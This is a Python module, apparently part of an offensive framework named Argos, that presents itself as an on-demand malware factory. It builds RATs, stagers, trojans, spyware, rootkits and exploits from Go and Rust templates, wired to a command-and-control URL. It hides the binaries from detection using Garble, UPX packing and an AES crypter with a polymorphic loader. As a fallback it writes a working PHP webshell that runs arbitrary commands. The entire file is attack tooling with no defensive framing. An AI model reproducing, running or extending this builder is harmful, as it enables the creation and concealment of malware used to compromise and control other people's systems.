"""
arsenal/builder.py
──────────────────
Arsenal Builder — Fábrica de malware bajo demanda.
Toma plantillas Go/Rust, inyecta parámetros, compila y aplica ofuscación.
"""

from __future__ import annotations

import logging
import os
import shutil
import subprocess
import uuid
from pathlib import Path
from typing import Any, Dict, List, Optional

log = logging.getLogger("argos.arsenal")

OUTPUT_DIR    = Path("./arsenal/output")
TEMPLATE_DIR  = Path("./arsenal/templates")


class ArsenalBuilder:
    """
    Construye binarios del arsenal a partir de plantillas.

    Soporta:
      - rat, stager, virus, trojan, spyware (Go)
      - rootkit (Rust + windows-rs / linux-kernel-module)
      - payload (Go/Rust shellcode)
      - webshell (PHP/ASPX/JSP)
      - exploit (Go/Python)
    """

    def build(
        self,
        malware_type: str,
        target_os:   str,
        arch:        str,
        params:      Dict[str, Any],
    ) -> Optional[str]:
        """
        Construye y devuelve la ruta del binario generado.
        """
        OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
        build_id  = str(uuid.uuid4())[:8]
        ext       = ".exe" if target_os == "windows" else ""
        out_name  = f"{malware_type}_{target_os}_{arch}_{build_id}{ext}"
        out_path  = OUTPUT_DIR / out_name

        template  = TEMPLATE_DIR / malware_type
        if not template.exists():
            log.warning(f"[Arsenal] Plantilla no encontrada: {template}")
            # Crear plantilla mínima si no existe
            self._create_minimal_template(malware_type)

        log.info(f"[Arsenal] Compilando {malware_type} para {target_os}/{arch}")

        success = False
        if malware_type in ("rat", "stager", "virus", "trojan", "spyware", "exploit", "payload"):
            success = self._build_go(template, out_path, target_os, arch, params)
        elif malware_type == "rootkit":
            success = self._build_rust(template, out_path, target_os, arch, params)
        elif malware_type == "webshell":
            success = self._build_webshell(template, out_path, params)

        if success:
            self._apply_obfuscation(out_path, params.get("obfuscation", []))
            log.info(f"[Arsenal] ✅ Binario: {out_path}")
            return str(out_path)

        log.error(f"[Arsenal] ❌ Error compilando {malware_type}")
        return None

    # ─── GO BUILD ─────────────────────────────────────────────────

    def _build_go(
        self,
        template: Path,
        output:   Path,
        target_os: str,
        arch:     str,
        params:   dict,
    ) -> bool:
        env = os.environ.copy()
        env["GOOS"]   = target_os if target_os != "mac" else "darwin"
        env["GOARCH"] = arch

        # Inyectar parámetros via ldflags
        c2_url   = params.get("c2_url", "")
        ldflags  = f'-s -w -X main.C2URL={c2_url} -X main.AgentVersion=2.0.0'

        # Usar Garble si está disponible, sino go build estándar
        garble = shutil.which("garble")
        if garble:
            cmd = [
                garble, "-tiny", "-literals", f"-seed={uuid.uuid4().hex}",
                "build", "-ldflags", ldflags, "-o", str(output.resolve()),
            ]
        else:
            cmd = [
                "go", "build", "-ldflags", ldflags,
                "-o", str(output.resolve()),
            ]
            log.warning("[Arsenal] Garble no encontrado — compilando sin ofuscación")

        return self._run_cmd(cmd, env=env, cwd=str(template))

    # ─── RUST BUILD ───────────────────────────────────────────────

    def _build_rust(self, template: Path, output: Path, target_os: str, arch: str, params: dict) -> bool:
        target_triple = self._rust_target(target_os, arch)
        cmd = [
            "cargo", "build", "--release",
            "--target", target_triple,
            "--manifest-path", str(template / "Cargo.toml"),
        ]
        success = self._run_cmd(cmd)
        if success:
            # Copiar binario compilado
            src = template / "target" / target_triple / "release" / template.name
            if src.exists():
                shutil.copy2(src, output)
                return True
        return False

    # ─── WEBSHELL ─────────────────────────────────────────────────

    def _build_webshell(self, template: Path, output: Path, params: dict) -> bool:
        # Webshells son archivos de texto; copiar y aplicar ofuscación básica
        lang = params.get("lang", "php")
        src  = template / f"shell.{lang}"
        if src.exists():
            shutil.copy2(src, output.with_suffix(f".{lang}"))
            return True
        # Crear webshell PHP básico si no hay plantilla
        output.with_suffix(".php").write_text(
            "<?php system($_REQUEST['cmd']); ?>\n",
            encoding="utf-8"
        )
        return True

    # ─── OBFUSCATION PIPELINE ─────────────────────────────────────

    def _apply_obfuscation(self, binary: Path, techniques: List[str]) -> None:
        if not binary.exists():
            return

        if "upx" in techniques:
            upx = shutil.which("upx")
            if upx:
                self._run_cmd([upx, "--best", "--lzma", str(binary)])
                log.info(f"[Arsenal] UPX aplicado: {binary.name}")
            else:
                log.warning("[Arsenal] UPX no encontrado")

        if "crypter" in techniques:
            self._apply_crypter(binary)

    def _apply_crypter(self, binary: Path) -> None:
        """Aplica cifrado AES-GCM al binario y genera un loader polimórfico."""
        try:
            from arsenal.crypter import AESCrypter

            crypter = AESCrypter()
            encrypted = crypter.encrypt_file(binary)
            if not encrypted:
                log.warning(f"[Arsenal] Crypter: No se pudo cifrar {binary.name}")
                return

            encrypted_path = binary.with_suffix(binary.suffix + ".enc")
            encrypted_path.write_bytes(encrypted)
            log.info(f"[Arsenal] Binario cifrado: {encrypted_path}")

            loader_path = binary.with_name(binary.stem + "_loader.go")
            crypter.generate_go_loader(encrypted, loader_path)
            log.info(f"[Arsenal] Loader Go generado: {loader_path}")
        except ImportError:
            log.warning("[Arsenal] Crypter: librería 'cryptography' no instalada")
        except Exception as exc:
            log.error(f"[Arsenal] Error en crypter: {exc}")

    # ─── MINIMAL TEMPLATE ─────────────────────────────────────────

    def _create_minimal_template(self, malware_type: str) -> None:
        tdir = TEMPLATE_DIR / malware_type
        tdir.mkdir(parents=True, exist_ok=True)

        # Si no existe main.go, linkear al código del agente real
        main_go = tdir / "main.go"
        if not main_go.exists():
            if malware_type == "stager":
                src = Path("agents/stager/main.go")
            elif malware_type in ("rat", "payload"):
                src = Path("agents/cell/main.go")
            else:
                src = None

            if src and src.exists():
                main_go.symlink_to(src.resolve())
            else:
                main_go.write_text(
                    f'''package main
import ("fmt"; "os")
var C2URL = "http://127.0.0.1:8443"
var AgentVersion = "2.0.0"
func main() {{ fmt.Fprintf(os.Stderr, "[{malware_type}] Argos Agent %s\\n", AgentVersion) }}
''',
                    encoding="utf-8",
                )

        gomod = tdir / "go.mod"
        if not gomod.exists():
            source_mod = None
            if malware_type == "stager":
                source_mod = Path("agents/stager/go.mod")
            elif malware_type in ("rat", "payload"):
                source_mod = Path("agents/cell/go.mod")
            if source_mod and source_mod.exists():
                gomod.symlink_to(source_mod.resolve())
            else:
                gomod.write_text(
                    f"module github.com/argos/arsenal/{malware_type}\n\ngo 1.22\n",
                    encoding="utf-8",
                )
        log.info(f"[Arsenal] Plantilla lista: {tdir}")

    # ─── UTILS ────────────────────────────────────────────────────

    @staticmethod
    def _run_cmd(cmd: list, env: Optional[dict] = None, cwd: Optional[str] = None) -> bool:
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True,
                env=env, timeout=300, cwd=cwd,
            )
            if result.returncode != 0:
                log.error(f"[Arsenal] Error: {result.stderr[:500]}")
                return False
            return True
        except FileNotFoundError as e:
            log.error(f"[Arsenal] Herramienta no encontrada: {e}")
            return False
        except subprocess.TimeoutExpired:
            log.error("[Arsenal] Timeout durante compilación")
            return False

    @staticmethod
    def _rust_target(os_type: str, arch: str) -> str:
        mapping = {
            ("windows", "amd64"): "x86_64-pc-windows-msvc",
            ("windows", "x86"):   "i686-pc-windows-msvc",
            ("linux",   "amd64"): "x86_64-unknown-linux-musl",
            ("linux",   "arm64"): "aarch64-unknown-linux-musl",
            ("mac",     "amd64"): "x86_64-apple-darwin",
            ("mac",     "arm64"): "aarch64-apple-darwin",
        }
        return mapping.get((os_type, arch), "x86_64-unknown-linux-musl")
